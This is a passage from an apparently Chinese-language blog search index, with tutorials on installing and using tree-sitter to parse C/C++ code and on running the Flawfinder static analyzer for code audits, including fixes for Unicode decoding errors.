          <category> Vulnerabilities </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软件安全 </tag>
            
            <tag> Vulnerabilities </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tree-sitter安装与基本使用</title>
      <link href="/2023/12/18/Security/CA%20Tool/%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"/>
      <url>/2023/12/18/Security/CA%20Tool/%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="初始化tree-sitter">初始化tree-sitter</h1><h2 id="安装tree-sitter">安装tree-sitter</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install tree-sitter</span><br></pre></td></tr></table></figure><h2 id="语言支持">语言支持</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">针对要解析的语言，创建文件夹，并从github的tree-sitter仓库下载语言支持</span></span><br><span class="line">mkdir vendor</span><br><span class="line">cd vendor</span><br><span class="line">git clone https://github.com/tree-sitter/tree-sitter-cpp</span><br><span class="line">git clone https://github.com/tree-sitter/tree-sitter-c</span><br></pre></td></tr></table></figure><h2 id="创建build文件夹">创建build文件夹</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">build于vendor是同级文件夹</span></span><br><span class="line">mkdir build</span><br></pre></td></tr></table></figure><p>创建language_build.py，生成.so文件，该文件相当于自定义的编译器，用于解析代码生成语法树</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tree_sitter <span class="keyword">import</span> Language, Parser</span><br><span class="line">Language.build_library(</span><br><span class="line">  <span class="comment"># Store the library in the `build` directory</span></span><br><span class="line">  <span class="string">&#x27;my-languages.so&#x27;</span>,</span><br><span class="line">  <span class="comment"># Include one or more languages</span></span><br><span class="line">  [</span><br><span class="line">    <span class="string">&#x27;../vendor/tree-sitter-c&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;../vendor/tree-sitter-cpp&#x27;</span></span><br><span class="line">  ]</span><br><span class="line">)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行该文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python language_build.py</span><br></pre></td></tr></table></figure><h1 id="使用初探">使用初探</h1><h2 id="基本过程">基本过程</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入依赖</span></span><br><span class="line"><span class="keyword">from</span> tree_sitter <span class="keyword">import</span> Language, Parser</span><br><span class="line"><span class="comment"># so文件路径和语言配置</span></span><br><span class="line">CPP_LANGUAGE = Language(<span class="string">&#x27;../build/my-languages.so&#x27;</span>, <span class="string">&#x27;cpp&#x27;</span>)</span><br><span class="line">C_LANGUAGE = Language(<span class="string">&#x27;../build/my-languages.so&#x27;</span>, <span class="string">&#x27;c&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 举一个CPP例子</span></span><br><span class="line">cpp_parser = Parser()</span><br><span class="line">cpp_parser.set_language(CPP_LANGUAGE)</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;dot/177755_CVE-2015-7540_CWE-399_vul.c&quot;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    code = file.read()</span><br><span class="line">tree = cpp_parser.parse(<span class="built_in">bytes</span>(code, <span class="string">&quot;utf8&quot;</span>))</span><br><span class="line"><span class="comment"># tree = parser.parse(source.encode(&#x27;utf-8&#x27;).decode(&#x27;unicode_escape&#x27;).encode())</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(tree))</span><br></pre></td></tr></table></figure><h2 id="遍历tree">遍历tree</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">print_tree</span>(<span class="params">node, indent=<span class="number">0</span></span>):</span><br><span class="line">    code = node.text.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27; &#x27;</span> * indent, node.<span class="built_in">type</span>, code)</span><br><span class="line">    <span class="keyword">for</span> child <span class="keyword">in</span> node.children:</span><br><span class="line">        print_tree(child, indent + <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">print_tree(tree.root_node)</span><br></pre></td></tr></table></figure><h2 id="tree节点属性">tree节点属性</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 孩子节点【节点数、节点列表】</span></span><br><span class="line">root_node.child_count: <span class="built_in">int</span></span><br><span class="line">root_node.children: <span class="built_in">list</span>[Node]| <span class="literal">None</span></span><br><span class="line"><span class="comment"># 该语法树节点对应代码字符串位置【左闭右开】</span></span><br><span class="line">root_node.start_byte: <span class="built_in">int</span></span><br><span class="line">root_node.end_byte: <span class="built_in">int</span></span><br><span class="line"><span class="comment"># 语法树节点对应代码 (行, 列) 位置元组</span></span><br><span class="line">root_node.start_point: <span class="built_in">tuple</span>[<span class="built_in">int</span>, <span class="built_in">int</span>]</span><br><span class="line">root_node.end_point: <span class="built_in">tuple</span>[<span class="built_in">int</span>, <span class="built_in">int</span>]</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">以上的行、列以及字符串位置都是以0开始</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># 语法树命名节点、命名类型 以及 语法树对应的文本</span></span><br><span class="line"><span class="comment"># 因为具体语法树有代码所有的标记，所以一些符号可能没有类型</span></span><br><span class="line"><span class="comment"># 我猜测该属性可以用于区别具体语法树符号节点，构建抽象语法树</span></span><br><span class="line">root_node.is_named: <span class="built_in">bool</span></span><br><span class="line">root_node.<span class="built_in">type</span>: <span class="built_in">str</span> <span class="comment"># 没有类型时，这里显示代码原始标记</span></span><br><span class="line">root_node.text: <span class="built_in">bytes</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 语法树父节点</span></span><br><span class="line">root_node.parent: Node| <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 语法树左兄弟、左命名兄弟</span></span><br><span class="line">root_node.prev_sibling: Node| <span class="literal">None</span></span><br><span class="line">root_node.prev_named_sibling: Node| <span class="literal">None</span></span><br><span class="line"><span class="comment"># 语法树右兄弟、右命名兄弟</span></span><br><span class="line">root_node.next_sibling: Node| <span class="literal">None</span></span><br><span class="line">root_node.next_named_sibling: Node| <span class="literal">None</span></span><br></pre></td></tr></table></figure><h3 id="附属性和方法">附：属性和方法</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;tree_sitter.Tree&#x27;</span>&gt;</span><br><span class="line"><span class="comment"># print(dir(tree))</span></span><br><span class="line"></span><br><span class="line">[<span class="string">&#x27;__class__&#x27;</span>, <span class="string">&#x27;__delattr__&#x27;</span>, <span class="string">&#x27;__dir__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__eq__&#x27;</span>, <span class="string">&#x27;__format__&#x27;</span>, <span class="string">&#x27;__ge__&#x27;</span>, <span class="string">&#x27;__getattribute__&#x27;</span>, <span class="string">&#x27;__gt__&#x27;</span>, <span class="string">&#x27;__hash__&#x27;</span>, <span class="string">&#x27;__init__&#x27;</span>, <span class="string">&#x27;__init_subclass__&#x27;</span>, <span class="string">&#x27;__le__&#x27;</span>, <span class="string">&#x27;__lt__&#x27;</span>, <span class="string">&#x27;__module__&#x27;</span>, <span class="string">&#x27;__ne__&#x27;</span>, <span class="string">&#x27;__new__&#x27;</span>, <span class="string">&#x27;__reduce__&#x27;</span>, <span class="string">&#x27;__reduce_ex__&#x27;</span>, <span class="string">&#x27;__repr__&#x27;</span>, <span class="string">&#x27;__setattr__&#x27;</span>, <span class="string">&#x27;__sizeof__&#x27;</span>, <span class="string">&#x27;__str__&#x27;</span>, <span class="string">&#x27;__subclasshook__&#x27;</span>, <span class="string">&#x27;changed_ranges&#x27;</span>, <span class="string">&#x27;edit&#x27;</span>, <span class="string">&#x27;included_ranges&#x27;</span>, <span class="string">&#x27;root_node&#x27;</span>, <span class="string">&#x27;root_node_with_offset&#x27;</span>, <span class="string">&#x27;text&#x27;</span>, <span class="string">&#x27;walk&#x27;</span>]</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;tree_sitter.Node&#x27;</span>&gt;</span><br><span class="line"><span class="comment"># print(dir(tree.root_node))</span></span><br><span class="line">[<span class="string">&#x27;__class__&#x27;</span>, <span class="string">&#x27;__delattr__&#x27;</span>, <span class="string">&#x27;__dir__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__eq__&#x27;</span>, <span class="string">&#x27;__format__&#x27;</span>, <span class="string">&#x27;__ge__&#x27;</span>, <span class="string">&#x27;__getattribute__&#x27;</span>, <span class="string">&#x27;__gt__&#x27;</span>, <span class="string">&#x27;__hash__&#x27;</span>, <span class="string">&#x27;__init__&#x27;</span>, <span class="string">&#x27;__init_subclass__&#x27;</span>, <span class="string">&#x27;__le__&#x27;</span>, <span class="string">&#x27;__lt__&#x27;</span>, <span class="string">&#x27;__module__&#x27;</span>, <span class="string">&#x27;__ne__&#x27;</span>, <span class="string">&#x27;__new__&#x27;</span>, <span class="string">&#x27;__reduce__&#x27;</span>, <span class="string">&#x27;__reduce_ex__&#x27;</span>, <span class="string">&#x27;__repr__&#x27;</span>, <span class="string">&#x27;__setattr__&#x27;</span>, <span class="string">&#x27;__sizeof__&#x27;</span>, <span class="string">&#x27;__str__&#x27;</span>, <span class="string">&#x27;__subclasshook__&#x27;</span>, <span class="string">&#x27;byte_range&#x27;</span>, <span class="string">&#x27;child&#x27;</span>, <span class="string">&#x27;child_by_field_id&#x27;</span>, <span class="string">&#x27;child_by_field_name&#x27;</span>, <span class="string">&#x27;child_count&#x27;</span>, <span class="string">&#x27;children&#x27;</span>, <span class="string">&#x27;children_by_field_id&#x27;</span>, <span class="string">&#x27;children_by_field_name&#x27;</span>, <span class="string">&#x27;descendant_count&#x27;</span>, <span class="string">&#x27;descendant_for_byte_range&#x27;</span>, <span class="string">&#x27;descendant_for_point_range&#x27;</span>, <span class="string">&#x27;edit&#x27;</span>, <span class="string">&#x27;end_byte&#x27;</span>, <span class="string">&#x27;end_point&#x27;</span>, <span class="string">&#x27;field_name_for_child&#x27;</span>, <span class="string">&#x27;grammar_id&#x27;</span>, <span class="string">&#x27;grammar_name&#x27;</span>, <span class="string">&#x27;has_changes&#x27;</span>, <span class="string">&#x27;has_error&#x27;</span>, <span class="string">&#x27;id&#x27;</span>, <span class="string">&#x27;is_error&#x27;</span>, <span class="string">&#x27;is_extra&#x27;</span>, <span class="string">&#x27;is_missing&#x27;</span>, <span class="string">&#x27;is_named&#x27;</span>, <span class="string">&#x27;kind_id&#x27;</span>, <span class="string">&#x27;named_child&#x27;</span>, <span class="string">&#x27;named_child_count&#x27;</span>, <span class="string">&#x27;named_children&#x27;</span>, <span class="string">&#x27;named_descendant_for_byte_range&#x27;</span>, <span class="string">&#x27;named_descendant_for_point_range&#x27;</span>, <span class="string">&#x27;next_named_sibling&#x27;</span>, <span class="string">&#x27;next_parse_state&#x27;</span>, <span class="string">&#x27;next_sibling&#x27;</span>, <span class="string">&#x27;parent&#x27;</span>, <span class="string">&#x27;parse_state&#x27;</span>, <span class="string">&#x27;prev_named_sibling&#x27;</span>, <span class="string">&#x27;prev_sibling&#x27;</span>, <span class="string">&#x27;range&#x27;</span>, <span class="string">&#x27;sexp&#x27;</span>, <span class="string">&#x27;start_byte&#x27;</span>, <span class="string">&#x27;start_point&#x27;</span>, <span class="string">&#x27;text&#x27;</span>, <span class="string">&#x27;type&#x27;</span>, <span class="string">&#x27;walk&#x27;</span>]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">byte_range (<span class="number">0</span>, <span class="number">283</span>)</span><br><span class="line">child &lt;built-<span class="keyword">in</span> method child of tree_sitter.Node <span class="built_in">object</span> at <span class="number">0x7f9f1c167d70</span>&gt;</span><br><span class="line">child_by_field_id &lt;built-<span class="keyword">in</span> method child_by_field_id of tree_sitter.Node <span class="built_in">object</span> at <span class="number">0x7f9f1c167d70</span>&gt;</span><br><span class="line">child_by_field_name &lt;built-<span class="keyword">in</span> method child_by_field_name of tree_sitter.Node <span class="built_in">object</span> at <span class="number">0x7f9f1c167d70</span>&gt;</span><br><span class="line">child_count <span class="number">1</span></span><br><span class="line">children [&lt;Node <span class="built_in">type</span>=function_definition, start_point=(<span class="number">0</span>, <span class="number">0</span>), end_point=(<span class="number">12</span>, <span class="number">2</span>)&gt;]</span><br><span class="line">children_by_field_id &lt;built-<span class="keyword">in</span> method children_by_field_id of tree_sitter.Node <span class="built_in">object</span> at <span class="number">0x7f9f1c167d70</span>&gt;</span><br><span class="line">children_by_field_name &lt;built-<span class="keyword">in</span> method children_by_field_name of tree_sitter.Node <span class="built_in">object</span> at <span class="number">0x7f9f1c167d70</span>&gt;</span><br><span class="line">descendant_count <span class="number">103</span></span><br><span class="line">descendant_for_byte_range &lt;built-<span class="keyword">in</span> method descendant_for_byte_range of tree_sitter.Node <span class="built_in">object</span> at <span class="number">0x7f9f1c167d70</span>&gt;</span><br><span class="line">descendant_for_point_range &lt;built-<span class="keyword">in</span> method descendant_for_point_range of tree_sitter.Node <span class="built_in">object</span> at <span class="number">0x7f9f1c167d70</span>&gt;</span><br><span class="line">edit &lt;built-<span class="keyword">in</span> method edit of tree_sitter.Node <span class="built_in">object</span> at <span class="number">0x7f9f1c167d70</span>&gt;</span><br><span class="line">end_byte <span class="number">283</span></span><br><span class="line">end_point (<span class="number">12</span>, <span class="number">2</span>)</span><br><span class="line">field_name_for_child &lt;built-<span class="keyword">in</span> method field_name_for_child of tree_sitter.Node <span class="built_in">object</span> at <span class="number">0x7f9f1c167d70</span>&gt;</span><br><span class="line">grammar_id <span class="number">214</span></span><br><span class="line">grammar_name translation_unit</span><br><span class="line">has_changes <span class="literal">False</span></span><br><span class="line">has_error <span class="literal">False</span></span><br><span class="line"><span class="built_in">id</span> <span class="number">24860624</span></span><br><span class="line">is_error <span class="literal">False</span></span><br><span class="line">is_extra <span class="literal">False</span></span><br><span class="line">is_missing <span class="literal">False</span></span><br><span class="line">is_named <span class="literal">True</span></span><br><span class="line">kind_id <span class="number">214</span></span><br><span class="line">named_child &lt;built-<span class="keyword">in</span> method named_child of tree_sitter.Node <span class="built_in">object</span> at <span class="number">0x7f9f1c167d70</span>&gt;</span><br><span class="line">named_child_count <span class="number">1</span></span><br><span class="line">named_children [&lt;Node <span class="built_in">type</span>=function_definition, start_point=(<span class="number">0</span>, <span class="number">0</span>), end_point=(<span class="number">12</span>, <span class="number">2</span>)&gt;]</span><br><span class="line">named_descendant_for_byte_range &lt;built-<span class="keyword">in</span> method named_descendant_for_byte_range of tree_sitter.Node <span class="built_in">object</span> at <span class="number">0x7f9f1c167d70</span>&gt;</span><br><span class="line">named_descendant_for_point_range &lt;built-<span class="keyword">in</span> method named_descendant_for_point_range of tree_sitter.Node <span class="built_in">object</span> at <span class="number">0x7f9f1c167d70</span>&gt;</span><br><span class="line">next_named_sibling <span class="literal">None</span></span><br><span class="line">next_parse_state <span class="number">0</span></span><br><span class="line">next_sibling <span class="literal">None</span></span><br><span class="line">parent <span class="literal">None</span></span><br><span class="line">parse_state <span class="number">0</span></span><br><span class="line">prev_named_sibling <span class="literal">None</span></span><br><span class="line">prev_sibling <span class="literal">None</span></span><br><span class="line"><span class="built_in">range</span> &lt;Range start_point=(<span class="number">0</span>, <span class="number">0</span>), start_byte=<span class="number">0</span>, end_point=(<span class="number">12</span>, <span class="number">2</span>), end_byte=<span class="number">283</span>&gt;</span><br><span class="line">sexp &lt;built-<span class="keyword">in</span> method sexp of tree_sitter.Node <span class="built_in">object</span> at <span class="number">0x7f9f1c167d70</span>&gt;</span><br><span class="line">start_byte <span class="number">0</span></span><br><span class="line">start_point (<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">text <span class="string">b&#x27;bool fun1(struct var1 *var2, bool *var3)\n &#123;\n        uint8_t var4 = 0;\n       fun2(var2, var5);\n       fun3(var2, &amp;var4);\n        if (var4 == 0xFF) &#123;\n                *var3 = true;\n       &#125; else &#123;\n               *var3 = false;\n        &#125;\n       fun4(var2);\n       return !var2-&gt;var6;\n &#125;&#x27;</span></span><br><span class="line"><span class="built_in">type</span> translation_unit</span><br><span class="line">walk &lt;built-<span class="keyword">in</span> method walk of tree_sitter.Node <span class="built_in">object</span> at <span class="number">0x7f9f1c167d70</span>&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Code Analysis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tree-sitter </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Flawfinder开源C/C++静态扫描分析工具安装与使用</title>
      <link href="/2023/12/18/Security/software%20security/FlawFinder_/"/>
      <url>/2023/12/18/Security/software%20security/FlawFinder_/</url>
      
        <content type="html"><![CDATA[<h2 id="flawfinder开源cc静态扫描分析工具安装与使用">Flawfinder开源C/C++静态扫描分析工具安装与使用</h2><h2 id="flawfinder的介绍">flawfinder的介绍</h2><p>Flawfinder是一款开源的关于C/C<ins>静态扫描分析工具，其根据内部字典数据库进行静态搜索，匹配简单的缺陷与漏洞，flawfinder工具不需要编译C/C</ins>代码，可以直接进行扫描分析。简单快速，最大的有点就是免费，不需要编译。flawfinder工具可以在官网进行下载。<br><a href="https://dwheeler.com/flawfinder/#downloading">https://dwheeler.com/flawfinder/#downloading</a></p><h2 id="flawfinder的安装">flawfinder的安装</h2><h3 id="在线安装">在线安装</h3><p>flawfinder安装比较简单，由于其是基于Python实现的一款工具，所以需要首先安装Python环境，并配置环境变量。flawfinder下载之后解压既可使用。flawfinder目前支持python2和python3，简单的方法是使用pip工具，执行以下指令进行安装。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install flawfinder</span><br></pre></td></tr></table></figure><h3 id="离线安装">离线安装</h3><p>直接从flawfinder下载程序压缩包，解压完成以后，使用python直接加载flawfiner程序即可，或者直接下载flawfinder-*.whl，使用pip工具离线安装，这种通常是在一些甲方审计项目中出现，甲方客户无法协调审计设备上的管理员权限，又无法连接外网，只能使用一些免安装的工具。对于这种情况，python直接使用免安装版本，使用离线的方式使用pip安装或者使用python直接运行flawfinder,给各位审计人员一个建议，原理这些不靠谱的甲方企业。</p><h2 id="flawfinder的使用">flawfinder的使用</h2><p>方式一：<code>flawfinder --csv &gt; test-result.csv test.c</code><br>这种方式根据缺陷库生成一个 .csv文件  ，你只需要根据这个.csv文件就可以转换为正常Excel文件使用，转换方法自行百度。<br>方式二：<code>flawfinder --html &gt; test-result.html test.c</code></p><h2 id="案例讲解">案例讲解</h2><p>由于在日常审计过程中，项目中有其他格式的文件，通常使用linux<code>find</code>工具批量筛选.c或者.cpp文件，然后使用flawfinder进行扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp --parents `find 程序目录/-name *.c`  指定扫描目录</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure><ul><li>增加–parents目录主要作用是在拷贝的时候，会在目标路径中创建源文件参数中的所有父目录层级(不止是一层父目录)，然后将源文件拷贝进去。这样做的目的主要是清晰展示目录结构，方便写报告。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flawfinder --csv &gt; result.csv 指定扫描目录</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure><p>导出csv文件内容展示如下<br><a href="https://hksanduo.github.io/img/flawfinder-csv.png"><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241047482.png" alt="flawfinder-csv.png"></a></p><p><a href="https://hksanduo.github.io/img/flawfinder-csv.png">flawfinder-csv.png</a></p><h2 id="flawfinder分析">flawfinder分析</h2><p>Flawfinder 不是类似于fortify那样复杂的工具,它是一个简单并有意义工具。Flawfinder通过使用内置的C/C++函数数据库来工作，该数据库具有众所周知的安全风险，例如缓冲区溢出风险（例如strcpy()，strcat()，gets()，sprintf()和scanf()），格式字符串问题（printf()，snprintf()和syslog()），竞争条件（例如access()，chown()，chgrp()，chmod()，tmpfile()，tmpnam()，tempnam()和mktemp()），潜在的远程命令执行风险（大多数exec()系列，system()，popen()）和较差的随机数获取方法（例如random()）。<br>Flawfinder的好处是不必创建相关数据库，自身就拥有相关数据库。Flawfinder获取源代码，并将源代码文本与这些名称匹配，同时忽略注释和字符串中的文本。Flawfinder还支持gettext（国际化程序的公共库），并且会将通过gettext传递的常量字符串当作常量字符串对待。这减少了国际化程序中的错误命中次数。<br>Flawfinder生成按风险分类的（潜在安全漏洞）列表；默认情况下，最危险的匹配项将首先显示。风险级别不仅取决于功能，还取决于功能的参数值。例如：在许多情况下，常量字符串通常比完全可变字符串的风险要小。在某些情况下，代码审计人员可能能够确定该结构体完全没有风险，从而减少了误报。与仅在源代码上运行“ grep”相比，Flawfinder提供了更好的信息和更好的优先级。flawfinder可以忽略注释和字符串内部，并且还将检查参数以估计风险水平。但是，从根本上来说，flawfinder仅仅是一个简单的python程序。它甚至不知道函数参数的数据类型，并且当然也不进行控制流或数据流分析。由于Flawfinder很简单，因此不会被宏定义和更复杂的工具遇到的其他奇怪问题所混淆。Flawfinder可以分析无法构建的软件；在某些情况下，它可以分析甚至无法在本地编译的文件。但是需要主要一点儿，并非发现的每个问题都是一个安全漏洞，也不一定能找到所有安全漏洞。如上所述，flawfinder不能真正理解代码的语义，它主要完成简单的文本模式匹配（忽略注释和字符串），不执行数据流或控制流分析，尽管如此，flawfinder在实际代码审计项目中也可以协助安全人员发现和消除安全漏洞。</p><h2 id="错误修复">错误修复</h2><h3 id="unicodedecodeerror-utf-8-codec-cant-decode-byte-0xff-in-position-0-invalid-start-byte">UnicodeDecodeError: ‘utf-8’ codec can’t decode byte 0xff in position 0: invalid start byte</h3><p>在运行过程中，会出现解码出错，官方给出的建议是通过强制转换扫描文档的格式为utf-8，我们可以直接忽略<br><code>UnicodeDecodeError: 'utf-8' codec can't decode byte 0xff in position 0: invalid start byte</code><br><a href="https://hksanduo.github.io/img/flawfinder-error.png"><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241047480.png" alt="flawfinder-error.png"></a></p><p><a href="https://hksanduo.github.io/img/flawfinder-error.png">flawfinder-error.png</a></p><h4 id="官方修复建议">官方修复建议</h4><p><a href="https://hksanduo.github.io/img/flawfinder-office-advice.png"><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241047486.png" alt="flawfinder-office-advice.png"></a></p><p><a href="https://hksanduo.github.io/img/flawfinder-office-advice.png">flawfinder-office-advice.png</a></p><p>将操作系统的编码格式设置成<code>utf-8</code>，将程序编码格式强制转换为utf-8，官方推荐的工具为<code>cvt2utf</code>，可以根据实际情况自行修改。</p><h4 id="个人修复建议">个人修复建议</h4><p><a href="https://hksanduo.github.io/img/flawfinder-persional-advice1.png"><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241047489.png" alt="flawfinder-persional-advice1.png"></a></p><p><a href="https://hksanduo.github.io/img/flawfinder-persional-advice1.png">flawfinder-persional-advice1.png</a></p><p>个人这个就有点儿暴力，直接在打开文件的那一步设定，如果出现错误直接忽略。flawfinder如果使用pip安装，安装的位置位于<code>/usr/local/bin/flawfinder</code>，其他安装方式，请根据实际情况进行查找。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241047492.png" alt="flawfinder-persional-advice2.png"></p><p>flawfinder-persional-advice2.png</p><h3 id="unicodedecodeerror-ascii-codec-cant-decode-byte-0xe6-in-position-29-ordinal-not-in-range128">UnicodeDecodeError: ‘ascii’ codec can’t decode byte 0xe6 in position 29: ordinal not in range(128)</h3><h4 id="错误原因">错误原因</h4><p>提示中的“ordinal not in range(128)”，意思是，字符不在128范围内，即说明不是普通的ASCII字符，超出处理能力了。</p><h4 id="解决方法">解决方法</h4><p>找到flawfinder程序文件，用文本编辑器打开，在文件抬头加入以下代码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(&quot;utf-8&quot;)</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure><h2 id="参考">参考</h2><ul><li><a href="https://dwheeler.com/flawfinder/%E3%80%90flawfinder%E5%AE%98%E7%BD%91%E3%80%91">https://dwheeler.com/flawfinder/【flawfinder官网】</a></li><li><a href="https://github.com/david-a-wheeler/flawfinder%E3%80%90github%E3%80%91">https://github.com/david-a-wheeler/flawfinder【github】</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Vulnerabilities </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 静态分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>符号执行</title>
      <link href="/2023/12/18/Security/software%20security/Symbolic%20Execution/"/>
      <url>/2023/12/18/Security/software%20security/Symbolic%20Execution/</url>
      
